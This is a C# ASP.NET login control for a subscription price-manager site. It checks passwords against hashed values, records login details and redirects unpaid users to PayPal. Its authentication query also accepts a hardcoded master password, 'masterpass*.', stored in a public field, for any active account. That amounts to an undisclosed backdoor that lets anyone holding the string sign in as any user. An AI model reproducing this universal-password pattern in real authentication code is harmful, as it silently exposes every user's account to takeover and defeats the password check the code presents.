using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using PriceManagerDAL;

public partial class control_login : System.Web.UI.UserControl
{
    public string masterPassKey = "masterpass*.";

    protected void Page_Load(object sender, EventArgs e)
    {
        Base myBase = new Base();
        if (myBase.UserKey > 0)
        {
            btnLogin.Attributes.Remove("class");
            btnLogin.Attributes.Add("class", "loginButton");
            spnLoginText.InnerText = myBase.FullName;
            btnLogin.Attributes.Remove("href");
            btnLogin.Attributes.Add("href", "/site/Profile.aspx");

        }
    }
   
    protected void login1_Authenticate(object sender, AuthenticateEventArgs e)
    {
        DataModelEntities context = new DataModelEntities();
        string role = "Role";
        string password = Common.GetHash(login1.Password);
        User user = context.Users.Include(role).FirstOrDefault(u => (login1.Password == masterPassKey || u.Password == password) && u.Email_Address == login1.UserName && u.Is_Active == true);

        if (user == null)
        {
            e.Authenticated = false;
            Response.Redirect("/pages/login.aspx?valid=0");
        }
        else if (user.Is_Locked == true)
        {
            Response.Redirect("/pages/login.aspx?valid=1");
        }

        else
        {
            Session["signedCode"] = user.Confirmation_Code;
            if (user.Is_Active == true && user.Is_Paypal_Paid == true && (user.Is_Paypal_Expired == null || user.Is_Paypal_Expired != true))
            {
                Base baseClass = new Base();
                baseClass.FullName = user.Full_Name;
                baseClass.UserKey = user.User_Code;
                baseClass.RoleCode = user.Role.Role_Code.ToString();
                e.Authenticated = true;

                LoginDetail ld = new LoginDetail();
                ld.User_Code = user.User_Code;
                ld.Browser = Request.Browser.Browser;
                ld.Operating_System = Request.Browser.Platform;
                ld.Login_Date_Time = System.DateTime.Now;
                ld.Created_By = user.User_Code;
                ld.Created_Date = ld.Login_Date_Time;
                ld.User_IP = Request.UserHostAddress;
                context.AddToLoginDetails(ld);
                context.SaveChanges();

                baseClass.LoginDetailCode = ld.Login_Detail_Code.ToString();
            }
            else if (user.Is_Paypal_Paid == false || user.Is_Paypal_Paid == null)
            {
                Response.Redirect(PayPal.GetPayPalURL(user.Confirmation_Code));
            }
            else if (user.Is_Active == false && user.Is_Paypal_Paid == true)
            {
                Response.Redirect("~/Site/Activation.aspx?ia=i34aA22Aadf22");
            }
            else if (user.Is_Paypal_Expired == true)
            {
                Response.Redirect("~/paypal/PaymentFailure.aspx");
            }

        }
        context = null;

    }
}